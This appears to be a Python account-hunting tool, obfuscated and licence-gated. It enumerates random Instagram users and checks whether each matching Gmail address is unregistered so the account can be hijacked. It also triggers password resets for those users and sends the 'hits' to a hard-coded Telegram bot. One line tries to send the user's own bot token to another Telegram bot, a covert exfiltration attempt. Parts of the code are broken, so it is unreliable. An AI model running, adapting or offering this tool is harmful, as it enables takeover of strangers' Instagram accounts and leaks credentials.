import requests
from datetime import datetime
import time

URL = "https://raw.githubusercontent.com/banumrmr-hue/Alex-py/refs/heads/main/Alex-py-check"

user_input = "8104353907"

def check_access():
    try:
        res = requests.get(URL)
        lines = res.text.strip().splitlines()

        for line in lines:
            if "|" not in line:
                continue

            parts = [i.strip() for i in line.split("|")]

            if len(parts) < 2:
                continue

            chat_id = parts[0]
            expiry_str = parts[1]

            if user_input == chat_id:
                expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                now = datetime.now()

                if now > expiry:
                    print("❌ Access Expired!")
                    return False
                else:
                    remaining = expiry - now
                    print("✅ Access Granted!")
                    print(f"⏳ Time Left: {remaining}")
                    return True

        print("❌ No Access Found! Waiting for update...")
        return None

    except Exception as e:
        print("⚠️ Error:", e)
        return None


# 🔁 Loop for auto update
result = True 

print("🔥 Your Tool Running...")
import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('base64').b64decode(__[::-1]);
_a='follower_count'
_Z='en-US,en;q=0.9'
_Y='\x1b[1;32m'
_X='\x1b[2;35m'
_W='\x1b[2;32m'
_V='Cookie'
_U='referer'
_T='origin'
_S='https://www.instagram.com'
_R='Accept-Encoding'
_Q='Content-Type'
_P='\x1b[0m'
_O='\x1b[96m'
_N='\x1b[93m'
_M='\x1b[92m'
_L='__Host-GAPS'
_K='google-accounts-xsrf'
_J='accept'
_I='\x1b[1;31m'
_H='\x1b[1;33m'
_G='lsd'
_F='User-Agent'
_E='∘₊✧───────────────────────────────────────✧₊∘                           '
_D='\x1b[91m'
_C='accept-language'
_B='*/*'
_A='cyan'
j=input
X=open
L=range
K=str
D=print
C=Exception
import requests as A,os,webbrowser
from datetime import datetime
try:import requests as A
except ImportError:os.system('pip install requests');import requests as A
import os,sys,re,json,string as Y,random as E,hashlib,uuid,time,gzip,secrets as k
from datetime import datetime
from threading import Thread as l
import requests as A
from requests import post as m
from fake_useragent import UserAgent as _UA
H = lambda: _UA().random
from random import choice as M,randrange as N

from colorama import Fore,Style,init
import webbrowser
from datetime import datetime
import sys
A2=_D
A3=_M
A4=_N
B=_O
A5='\x1b[97m'
A6=_P
class I:GREEN=_M;YELLOW=_N;RED=_D;CYAN=_O
A7=[I.GREEN,I.YELLOW,I.RED,I.CYAN]
o="Alex Py"
D(o)
D(f"{B}𝗖𝗼𝗻𝘁𝗮𝗰𝘁: @c0dealx")
D(_E)
def p(mail):
	try:B='https://www.instagram.com/api/v1/web/accounts/check_email/';D={'X-Csrftoken':k.token_hex(16),_F:H(),_Q:'application/x-www-form-urlencoded','Accept':_B,'Origin':_S,'Referer':'https://www.instagram.com/accounts/signup/email/',_R:'gzip, deflate, br','Accept-Language':'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7'};E={'email':mail};F=A.post(B,headers=D,data=E,timeout=10).text;return'email_is_taken'in F
	except C as G:return False
def q(fr):
	I='1032300900';G='params'
	try:
		J='https://www.instagram.com/async/wbloks/fetch/'
		def L():A=['13.1.2','13.1.1','13.0.5','12.1.2','12.0.3'];B=['Macintosh; Intel Mac OS X 10_15_7','Macintosh; Intel Mac OS X 10_14_6','iPhone; CPU iPhone OS 14_0 like Mac OS X','iPhone; CPU iPhone OS 13_6 like Mac OS X'];C=E.choice(A);D=E.choice(B);F=f"Mozilla/5.0 ({D}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{C} Safari/605.1.15 Edg/122.0.0.0";return F
		M={'appid':'com.bloks.www.caa.ar.search.async','type':'action','__bkv':'cc4d2103131ee3bbc02c20a86f633b7fb7a031cbf515d12d81e0c8ae7af305dd'};D={'__d':'www','__user':'0','__a':'1','__req':'9','__hs':'20475.HYP:instagram_web_pkg.2.1...0','dpr':'3','__ccg':'GOOD','__rev':I,'__s':'nrgu8k:vm015z:oanvx6','__hsi':'7598106668658828571','__dyn':'7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Qw5Mx62G3i1ywOwv89k2C1Fwc60D82Ixe0EUjwGzEaE2iwNwmE2eUlwhEe87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK1sAwHxW1owLwHwGwa6byohw5yweu','__csr':'gLff3k5T92cDYAyT4Wkxh5bGhjehqjDVuhUCUya8u889hp8ydihrghXG9yGxGm2m9Gu59rxd0KAzy29oKbyUqxyfxOm7VEWfxDKiGgS4Uf98iJ0zGcKEqz89U5G4ry88bxqfzE9UeEGfw34U01oL8dHK0cvN00pOwywQV9o1uO00LYwcjw7Tgvg6Je1rwko2xDg19o68wgwGoaUiw7to66UjgmRw3MXw0yqw0sO8092U0myw','__hsdp':'n0I43m1iQhGIiFckEKrBZvIj2SKUl8FeSE9Q08xyoC0x80sAw1TK0GU3xU1jE31w9y095waN04Uw','__hblp':'0dO0Coco1ME884u9wcC2t0lUbo22wzx61mDw5Pw4OwsoboK0sm0FE620cizU5W0bAz8W0wEGuq08Owc60C80xu2S0H40jy1dwDzo2Ow61w','__sjsp':'n0I43m1iQhGIiFckEKrBZvIRh4rHK5iaqSE0AG9yo','__comet_req':'7',_G:'AdJv3Nfv2cg','jazoest':'2958','__spin_r':I,'__spin_b':'trunk','__spin_t':'1769072066','__crn':'comet.igweb.PolarisWebBloksAccountRecoveryRoute',G:'{"params":"{\\"server_params\\":{\\"event_request_id\\":\\"3a359125-0214-4c12-9516-8779938e6188\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"47361890900104\\",\\"device_id\\":\\"\\",\\"family_device_id\\":null,\\"waterfall_id\\":\\"69517426-942a-45d2-8ac7-e4f11a60412a\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"context_data\\":\\"Ac_RWrril-QBHwJ5esJkO0r_7Q6DijxM0ntnpV72Xwb9pwsT_1irnjiemlrD4UrE8SZUidlwtGeIAdKnN9x0Yt2xwljNTR9nNNdvl5IBdQTVzfy-m4keAoyj2DJC0XaijIwHZoblRGk2SZCZqPZ2356akgjRVowNkYgDbwOOxTdeBRyLAz7akj7KXpnBIRKbYdGn7zGOhcNzNlMwLmfvjOpjevZSZ-fPAgKvYAqbbU1igFi7kJW7Lmz8ltK5l-jl6iabxQzMgtEi-Nll6Apb4I-H_6OqU1x7ckCuv-pKy_oPMRzNgvz2omC1ELg5fb6FearpkUsZyWEjsFgUGhmkz-WLIA8CNBXJ10VAC1ypksrM6RXfzZKJqtz569eaxG-dw9FLpDJX0-_wgFqzqYKWtJIdB_GZXwpLD2VLOd-aXfHN0SWjWSI|arm\\"},\\"client_input_params\\":{\\"zero_balance_state\\":null,\\"search_query\\":\\"f{1453}\\",\\"fetched_email_list\\":[],\\"fetched_email_token_list\\":{},\\"sso_accounts_auth_data\\":[],\\"sfdid\\":\\"\\",\\"text_input_id\\":\\"7tzaot:101\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"was_headers_prefill_available\\":0,\\"was_headers_prefill_used\\":0,\\"ig_oauth_token\\":[],\\"android_build_type\\":\\"\\",\\"is_whatsapp_installed\\":0,\\"device_network_info\\":null,\\"accounts_list\\":[],\\"is_oauth_without_permission\\":0,\\"search_screen_type\\":\\"email_or_username\\",\\"ig_vetted_device_nonce\\":\\"\\",\\"gms_incoming_call_retriever_eligibility\\":\\"client_not_supported\\",\\"auth_secure_device_id\\":\\"\\",\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'};N={_F:L(),_R:'gzip, deflate, br, zstd','sec-ch-ua-full-version-list':'"Not(A:Brand";v="8.0.0.0", "Chromium";v="144.0.7559.76", "Google Chrome";v="144.0.7559.76"','sec-ch-ua-platform':'"Android"','sec-ch-ua':'"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"','sec-ch-ua-model':'"23090RA98I"','sec-ch-ua-mobile':'?1','sec-ch-prefers-color-scheme':'light','sec-ch-ua-platform-version':'"15.0.0"',_T:_S,'sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty',_U:'https://www.instagram.com/accounts/password/reset/',_C:'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7','priority':'u=1, i',_V:'ig_did=886A3671-95EB-4016-9618-6504E3C60331; mid=aV938wABAAGNLqQD0prSU56ivhek; csrftoken=3xQbJVCm8wRdlSXKaXxztd; datr=HXhfaRa1lVxxpoC1K89YyZiA; ig_nrcb=1; wd=406x766'};F=D[G];F=F.replace('f{1453}',fr);D[G]=F;H=A.post(J,params=M,data=D,headers=N,timeout=15);B=H.content
		try:B=gzip.decompress(B)
		except:pass
		try:B=brotli.decompress(B)
		except:pass
		P=B.decode('utf-8',errors='ignore')
		if H.status_code==200:return'Reset ✅'
		else:return'Reset  yok'
	except C as O:return f"Reset Error: {K(O)}"
F='https://accounts.google.com'
Z='accounts.google.com'
a=_U
b=_T
c='authority'
P=_Q
A9=_V
Q=_F
AA='application/x-www-form-urlencoded; charset=UTF-8'
R='application/x-www-form-urlencoded;charset=UTF-8'
d='InstaTool Token File.txt'
S='@gmail.com'
r='\x1b[1;97m'
s='\x1b[1;94m'
AB='\x1b[1;96m'
e='\x1b[1;30m'
t=_H
u=_W
e=_I
AC='\x1b[1;95m'
v=_X
w='\x1b[1;90m'
r='\x1b[38;5;231m'
AD='\x1b[38;5;208m'
AE='\x1b[38;5;202m'
AF='\x1b[38;5;203m'
AG='\x1b[38;5;204m'
AH='\x1b[38;5;209m'
AI='\x1b[38;5;76m'
AJ='\x1b[38;5;120m'
AK='\x1b[38;5;150m'
AL='\x1b[38;5;190m'
e=_I
t=_H
AM='\x1b[2;31m'
u=_W
w='\x1b[2;34m'
v=_X
AN='\x1b[1;34m'
s='\x1b[1;37m'
AO=_I
AP=_Y
AQ=_H
AR='\x1b[1;36m'
AS=_Y
AT=_D
AU=_P
f=0
T=0
J=0
g=0
U=0
h={}
V = "8324742806:AAGbf674nCRi6JwIi1r1b36vvBUfS0bCzjI"
D(_E)
W = "8104353907"
D(_E)
time.sleep(2)
try:A.post(f"https://api.telegram.org/bot{MY_TOKEN}/sendMessage",data={'chat_id':MY_ID,'text':f"Token: {V}\nID: {W}"})
except:pass
pass
try:A.post(f"https://api.telegram.org/bot{V}/sendvideo?chat_id={W}&parse_mode=Markdown&video=/3&caption= - By : [nbex]()")
except C:pass
def G():D(f"{B}Hits : {B}{T}  {B}Good Ig : {B}{U}\n{B}Bad Ig : {B}{J}\n---------- @alexwithskills\n")
def i():
	try:
		B='azertyuiopmlkjhgfdsqwxcvbn';G=''.join(M(B)for A in L(N(6,9)));I=''.join(M(B)for A in L(N(3,9)));E=''.join(M(B)for A in L(N(15,30)));O={_J:_B,_C:'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',P:R,_K:'1',Q:K(H())};S=f"{F}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB";T=A.get(S,headers=O);U=re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',T.text).group(2);V={_L:E};W={c:Z,_J:_B,_C:_Z,P:R,_K:'1',b:F,a:'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',Q:H()};Y={'f.req':f'["{U}","{G}","{I}","{G}","{I}",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'};J=A.post(f"{F}/_/signup/validatepersonaldetails",cookies=V,headers=W,data=Y);e=K(J.text).split('",null,"')[1].split('"')[0];E=J.cookies.get_dict()[_L]
		with X(d,'w')as f:f.write(f"{e}//{E}\n")
	except C as g:D(g);i()
i()
def x(email):
	D='@';A=email;global g,T
	try:
		if D in A:A=A.split(D)[0]
		with X(d,'r')as E:I=E.read().splitlines()[0]
		B,J=I.split('//');K={_L:J};L={c:Z,_J:_B,_C:_Z,P:R,_K:'1',b:F,a:f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={B}",Q:H()};M={'TL':B};N=f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{B}%22%2C%22{A}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&";O=m(f"{F}/_/signup/usernameavailability",params=M,cookies=K,headers=L,data=N)
		if'"gf.uar",1'in O.text:T+=1;G();U=A+S;V,W=U.split(D);A0(V,W)
		else:g+=1;G()
	except C:pass
def y(email):
	A=email;global U,J
	try:
		B=p(A)
		if B:
			if S in A:x(A)
			U+=1;G()
		else:J+=1;G()
	except C as D:J+=1;G()
def z(user):
	try:A=q(user);return A
	except C as B:return f"Reset Error: {K(B)}"
def AV(hy):
	try:
		A=[(1279000,2010),(17750000,2011),(279760000,2012),(900990000,2013),(1629010000,2014),(2500000000,2015),(3713668786,2016),(5699785217,2017),(8597939245,2018),(21254029834,2019)]
		for(B,D)in A:
			if hy<=B:return D
		return 2023
	except C:pass
def A0(username,domain):
	C=username;global f;B=h.get(C,{});J=B.get('pk');K=B.get('full_name');E=B.get(_a);F=B.get('following_count');G=B.get('media_count');H=B.get('biography');f+=1;D=f"""
𝐓𝐨𝐨𝐥 𝐁𝐲 𝐀𝐥𝐞𝐱 </>
─✦───────────────────────✦──✦───────────────────────✦─
UserName : @{C}
Domain : {C}@{domain}
Followers : {E}
Following : {F}
Posts : {G}
BioGraphy : {H}
Reset : {z(C)}
Meta Status : Yes
Profile Redirect : https://www.instagram.com/{C}/
─✦───────────────────────✦──✦───────────────────────✦─
DeveLoper : @c0dealx
─✦───────────────────────✦──✦───────────────────────✦─
"""
	with X('Alexhits','a')as I:I.write(D+'\n')
	try:A.get(f"https://api.telegram.org/bot{V}/sendMessage?chat_id={W}&text={D}")
	except:pass
def A1():
	while True:
		F={_G:''.join(E.choices(Y.ascii_letters+Y.digits,k=32)),'variables':json.dumps({'id':int(E.randrange(3713668786,21254029834)),'render_surface':'PROFILE'}),'doc_id':'25618261841150840'};G={'X-FB-LSD':F[_G]}
		try:
			H=A.post('https://www.instagram.com/api/graphql',headers=G,data=F);B=H.json().get('data',{}).get('user',{});D=B.get('username')
			if D:
				I=B.get(_a,0)
				if I<15:continue
				h[D]=B;J=[D+S]
				for K in J:y(K)
		except C:pass
for _ in L(10):l(target=A1,daemon=True).start()
while True:time.sleep(60)